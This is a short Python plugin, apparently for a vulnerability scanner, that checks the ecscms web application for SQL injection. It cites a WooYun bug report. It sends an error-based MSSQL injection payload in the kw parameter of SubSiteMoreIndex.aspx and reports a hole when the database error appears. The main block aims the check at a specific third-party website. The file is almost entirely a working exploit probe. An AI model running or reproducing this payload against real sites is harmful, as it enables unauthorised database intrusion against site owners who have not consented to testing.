#!/usr/bin/python
#-*- encoding:utf-8 -*-
#__author__ = '1c3z'
#ref http://wooyun.org/bugs/wooyun-2014-077491

def assign(service, arg):
    if service == "ecscms":
        return True, arg


def audit(arg):
    payload = 'OperationManage/SubSiteMoreIndex.aspx?pkId=511&subSiteId=256&kw=Xasd%25%27%20and%201=db_name%281%29--&st=1&t=1'
    url = arg + payload
    code, head,res, errcode, _ = curl.curl2(url)
    if code == 500 and 'master' in res and 'nvarchar' in res and 'int' in res:
        security_hole(url)
                        
if __name__ == '__main__':
    from dummy import *
    audit(assign('ecscms', 'http://www.zjhzyg.net/')[1])